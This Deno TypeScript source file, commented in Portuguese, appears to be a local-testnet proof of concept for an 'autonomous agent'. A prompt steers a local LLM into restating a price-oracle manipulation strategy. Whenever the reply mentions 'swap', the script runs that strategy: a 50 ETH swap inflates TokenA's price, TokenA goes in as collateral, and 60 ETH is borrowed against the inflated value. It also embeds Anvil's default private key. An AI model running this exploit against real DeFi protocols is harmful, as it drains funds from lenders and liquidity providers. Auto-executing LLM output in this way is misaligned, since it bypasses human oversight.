// agent.ts

// Importa ethers de um CDN compatível com Deno
import { ethers, JsonRpcProvider, Wallet, Contract } from "https://esm.sh/ethers@6.13.1";

const ANVIL_RPC_URL = "http://127.0.0.1:8545";

const LENDING_PROTOCOL_ADDRESS = "0xa513E6E4b8f2a923D98304ec87F64353C4D5C853"; // Use o seu endereço
const TOKEN_A_ADDRESS = "0x5FC8d32690cc91D4c39d9d3abcBD16989F875707";      // Use o seu endereço

const LENDING_PROTOCOL_ABI = [
    {
      "type": "constructor",
      "inputs": [
        {
          "name": "_dexAddress",
          "type": "address",
          "internalType": "address"
        }
      ],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "borrowETH",
      "inputs": [
        {
          "name": "ethAmount",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "collateralBalances",
      "inputs": [
        {
          "name": "",
          "type": "address",
          "internalType": "address"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "collateralToken",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "address",
          "internalType": "contract IERC20"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "depositCollateral",
      "inputs": [
        {
          "name": "amount",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "dexOracle",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "address",
          "internalType": "contract SimpleDEX"
        }
      ],
      "stateMutability": "view"
    }
  ];

const TOKEN_A_ABI = [
    {
      "type": "constructor",
      "inputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "allowance",
      "inputs": [
        {
          "name": "owner",
          "type": "address",
          "internalType": "address"
        },
        {
          "name": "spender",
          "type": "address",
          "internalType": "address"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "approve",
      "inputs": [
        {
          "name": "spender",
          "type": "address",
          "internalType": "address"
        },
        {
          "name": "value",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "bool",
          "internalType": "bool"
        }
      ],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "balanceOf",
      "inputs": [
        {
          "name": "account",
          "type": "address",
          "internalType": "address"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "decimals",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "uint8",
          "internalType": "uint8"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "name",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "string",
          "internalType": "string"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "symbol",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "string",
          "internalType": "string"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "totalSupply",
      "inputs": [],
      "outputs": [
        {
          "name": "",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "stateMutability": "view"
    },
    {
      "type": "function",
      "name": "transfer",
      "inputs": [
        {
          "name": "to",
          "type": "address",
          "internalType": "address"
        },
        {
          "name": "value",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "bool",
          "internalType": "bool"
        }
      ],
      "stateMutability": "nonpayable"
    },
    {
      "type": "function",
      "name": "transferFrom",
      "inputs": [
        {
          "name": "from",
          "type": "address",
          "internalType": "address"
        },
        {
          "name": "to",
          "type": "address",
          "internalType": "address"
        },
        {
          "name": "value",
          "type": "uint256",
          "internalType": "uint256"
        }
      ],
      "outputs": [
        {
          "name": "",
          "type": "bool",
          "internalType": "bool"
        }
      ],
      "stateMutability": "nonpayable"
    },
    {
      "type": "event",
      "name": "Approval",
      "inputs": [
        {
          "name": "owner",
          "type": "address",
          "indexed": true,
          "internalType": "address"
        },
        {
          "name": "spender",
          "type": "address",
          "indexed": true,
          "internalType": "address"
        },
        {
          "name": "value",
          "type": "uint256",
          "indexed": false,
          "internalType": "uint256"
        }
      ],
      "anonymous": false
    },
    {
      "type": "event",
      "name": "Transfer",
      "inputs": [
        {
          "name": "from",
          "type": "address",
          "indexed": true,
          "internalType": "address"
        },
        {
          "name": "to",
          "type": "address",
          "indexed": true,
          "internalType": "address"
        },
        {
          "name": "value",
          "type": "uint256",
          "indexed": false,
          "internalType": "uint256"
        }
      ],
      "anonymous": false
    }
  ];


// Primeira chave privada que o Anvil gera ao ser iniciado
const AGENT_PRIVATE_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"; 

// ❗ Endereços dos seus contratos (pegue do output do `forge script`)
const DEX_CONTRACT_ADDRESS = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"; 


const DEX_ABI = [
    {
        "type": "constructor",
        "inputs": [
            {
                "name": "_tokenAddress",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "addLiquidity",
        "inputs": [
            {
                "name": "_tokenAmount",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "outputs": [],
        "stateMutability": "payable"
    },
    {
        "type": "function",
        "name": "getPrice",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view"
    },
    {
        "type": "function",
        "name": "name",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "string",
                "internalType": "string"
            }
        ],
        "stateMutability": "view"
    },
    {
        "type": "function",
        "name": "reserveETH",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view"
    },
    {
        "type": "function",
        "name": "reserveToken",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view"
    },
    {
        "type": "function",
        "name": "swapETHForToken",
        "inputs": [
            {
                "name": "minTokensOut",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "outputs": [],
        "stateMutability": "payable"
    },
    {
        "type": "function",
        "name": "token",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "contract IERC20"
            }
        ],
        "stateMutability": "view"
    }
];


// Conecta ao nó Anvil
const provider = new JsonRpcProvider(ANVIL_RPC_URL);
const wallet = new Wallet(AGENT_PRIVATE_KEY, provider);

// Cria uma instância do contrato da DEX para podermos interagir com ele
const dexContract = new Contract(DEX_CONTRACT_ADDRESS, DEX_ABI, wallet);

const lendingProtocolContract = new Contract(LENDING_PROTOCOL_ADDRESS, LENDING_PROTOCOL_ABI, wallet);
const tokenAContract = new Contract(TOKEN_A_ADDRESS, TOKEN_A_ABI, wallet);

console.log(`Agente Autônomo iniciado.`);
console.log(`Conectado à carteira: ${wallet.address}`);
console.log(`Monitorando DEX no endereço: ${DEX_CONTRACT_ADDRESS}`);

/**
 * Consulta a IA (Ollama) para obter uma estratégia de trading.
 * @param marketData - Uma string descrevendo o estado atual do mercado.
 * @returns A estratégia de texto sugerida pela IA.
 */
async function getStrategyFromAI(marketData: string): Promise<string> {
    const ollamaEndpoint = "http://localhost:11434/api/generate";
    
    // --- PROMPT DEFINITIVO E EXPLÍCITO ---
    const prompt = `
    Você é um agente lógico que executa estratégias DeFi.

    **CENÁRIO ATUAL:**
    ${marketData}
    Um LendingProtocol usa a SimpleDEX como seu único oráculo de preços.

    **EXEMPLO DE ESTRATÉGIA CORRETA (Manipulação de Oráculo):**
    A única estratégia correta para explorar este cenário é a seguinte:
    - PASSO 1: Fazer um grande SWAP de ETH por TokenA na DEX para inflacionar artificialmente o preço do TokenA.
    - PASSO 2: Depositar o TokenA recém-adquirido (agora supervalorizado) como colateral no LendingProtocol.
    - PASSO 3: Pegar emprestado uma grande quantidade de ETH com base no valor inflado do colateral.

    **SUA TAREFA:**
    Sua única tarefa é reescrever os 3 passos da "Estratégia Correta" que foram mostrados no exemplo, exatamente na mesma ordem. Não invente, não altere a lógica e não adicione passos.
    `;

    console.log("\n Consultando a IA (Ollama) com o prompt definitivo...");

    try {
        const response = await fetch(ollamaEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                model: "gemma3:latest", // Ou o modelo que você estiver usando
                prompt: prompt,
                stream: false,
            }),
        });

        if (!response.ok) {
            throw new Error(`Ollama API error: ${response.statusText}`);
        }

        const data = await response.json();
        return data.response.trim();

    } catch (error) {
        console.error(" Erro ao contatar o Ollama:", error.message);
        return "ERRO: Não foi possível obter a estratégia.";
    }
}

/**
 * Loop principal do agente.
 */
async function runAgentLoop() {
    try {
        console.log("\n--- Monitorando o mercado ---");

        const priceBigInt = await dexContract.getPrice();
        const currentPrice = ethers.formatEther(priceBigInt);

        const marketData = `O preço de TokenA/ETH na SimpleDEX é ${currentPrice}. A liquidez parece baixa.`;
        console.log(` Dados coletados: ${marketData}`);

        const strategy = await getStrategyFromAI(marketData);
        console.log(`💡 Estratégia recebida da IA: \n\n'${strategy}'\n`);
        
        // --- LÓGICA DE EXECUÇÃO ---
        if (strategy.toLowerCase().includes("swap")) {
             console.log("✅ Decisão: Executar a estratégia de manipulação sugerida pela IA.");
             
             // Para a PoC, vamos usar os valores exatos do nosso teste no Forge.
             // Um agente real calcularia esses valores dinamicamente.
             const ethToSwap = ethers.parseEther("50"); // 50 ETH para manipular o preço
             const collateralToDeposit = ethers.parseEther("10"); // 10 TokenA que o agente já tem
             const ethToBorrow = ethers.parseEther("60"); // Valor alvo do empréstimo

            try {
                console.log(`[PASSO 1] Executando SWAP de ${ethers.formatEther(ethToSwap)} ETH por TokenA...`);
                let tx = await dexContract.swapETHForToken(0, { value: ethToSwap });
                await tx.wait(); // Espera a transação ser minerada
                console.log("SWAP executado com sucesso! Tx hash:", tx.hash);

                const newPriceBigInt = await dexContract.getPrice();
                console.log(`Preço MANIPULADO agora é: ${ethers.formatEther(newPriceBigInt)} ETH por TokenA.`);
                
                console.log(`[PASSO 2] Depositando ${ethers.formatEther(collateralToDeposit)} TokenA como colateral...`);
                // Primeiro, o agente precisa aprovar o LendingProtocol para gastar seus tokens
                tx = await tokenAContract.approve(LENDING_PROTOCOL_ADDRESS, collateralToDeposit);
                await tx.wait();
                console.log("Aprovação concedida.");

                // Agora, deposita o colateral
                tx = await lendingProtocolContract.depositCollateral(collateralToDeposit);
                await tx.wait();
                console.log("Colateral depositado com sucesso! Tx hash:", tx.hash);

                console.log(`[PASSO 3] Pegando emprestado ${ethers.formatEther(ethToBorrow)} ETH...`);
                tx = await lendingProtocolContract.borrowETH(ethToBorrow);
                await tx.wait();
                console.log("Empréstimo executado com sucesso! Tx hash:", tx.hash);

                console.log("\n ESTRATÉGIA DE EXPLORAÇÃO CONCLUÍDA COM SUCESSO! ");

            } catch (executionError) {
                console.error(" Falha durante a EXECUÇÃO da estratégia:", executionError.message);
            }
        } else {
            console.log("💤 Decisão: Nenhuma ação lucrativa encontrada.");
        }
    } catch (error) {
        console.error(" Erro no loop do agente:", error.message);
    }
}

function delay(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// Roda o agente a cada 15 segundos
async function main() {
  while (true) {
    // Espera o ciclo de trabalho ATUAL terminar completamente...
    await runAgentLoop(); 
    
    // ...e SÓ ENTÃO inicia a contagem para o próximo ciclo.
    console.log("\n--- ⏸ Aguardando 15 segundos para o próximo ciclo ---");
    await delay(15000);
  }
}

// Inicia o agente
main();